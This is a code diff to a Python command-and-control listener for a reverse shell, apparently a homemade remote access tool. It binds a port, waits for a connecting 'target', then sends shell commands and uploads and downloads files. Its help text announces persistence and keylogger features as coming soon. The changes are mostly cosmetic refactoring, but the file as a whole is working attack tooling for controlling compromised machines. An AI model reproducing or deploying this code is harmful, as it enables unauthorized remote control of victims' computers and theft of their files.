@@ -2,7 +2,7 @@ import os
 import json
 import socket
 
-import termcolor
+from termcolor import colored
 
 
 def reliable_send(data):
@@ -23,6 +23,7 @@ def reliable_receive():
 def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
+    f.close()
 
 
 def download_file(file_name):
@@ -43,7 +44,7 @@ def download_file(file_name):
 def communication():
     count = 1
     while True:
-        command = input(termcolor.colored('* Shell~%s: ' % str(ip), 'blue'))
+        command = input(colored('* Shell~%s: ' % str(ip), 'blue'))
         reliable_send(command)
         
         #QUIT
@@ -75,9 +76,9 @@ def communication():
         elif command.startswith('cd'):
             result = reliable_receive()
             if result is False:
-                print(termcolor.colored("Directory not found or misspelled", 'red'))
+                print(colored("Directory not found or misspelled", 'red'))
             else:
-                print(termcolor.colored(f'Changed Directory to: {result}', 'green'))
+                print(colored(f'Changed Directory to: {result}', 'green'))
 
         #UPLOAD
         elif command.startswith('-U'):
@@ -91,9 +92,11 @@ def communication():
 
         #HELP
         elif command == 'help':
-            print(termcolor.colored('''
-            [!!]Commands are CaSe SeNsItIvE [!!]
-            ''', 'red')+'\n'+termcolor.colored('''\n
+            print(colored('''
+            [!!] Commands are CaSe SeNsItIvE      [!!]
+            [!!] Persistence is not available yet [!!]
+            [!!] Keylogger is not available yet   [!!]
+            ''', 'red')+'\n'+colored('''\n
             quit                                --> Quit The Current Session
             clear                               --> Clear The Screen
             cd *Directory Name*                 --> Changes Directory
@@ -106,16 +109,18 @@ def communication():
             \n''', 'yellow'))
         else:
             result = reliable_receive()
-            print(termcolor.colored(result, 'green'))
+            print(colored(result, 'green'))
 
 IP_ADDRESS = ''
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-sock.bind(('192.168.56.1', 9797)) #change IP Address here
-print(termcolor.colored('[+] Port Listening for Targets....', 'yellow'))
+sock.bind((IP_ADDRESS, 9797)) #change IP Address here
+print(colored('[+] Port Listening for Targets....', 'yellow'))
 sock.listen(5)
 target, ip = sock.accept()
 
-print(termcolor.colored(f'[+] Target found from IP ADDRESS: ', 'green'), end='')
-print(termcolor.colored(f'{str(ip[0]).strip()}', 'red', attrs=['bold', 'underline']))
+print(colored(
+    f'[+] Target found from IP ADDRESS: ', 'green')+
+    colored(f'{str(ip[0]).strip()}', 'red', attrs=['bold', 'underline']))
+
 communication()
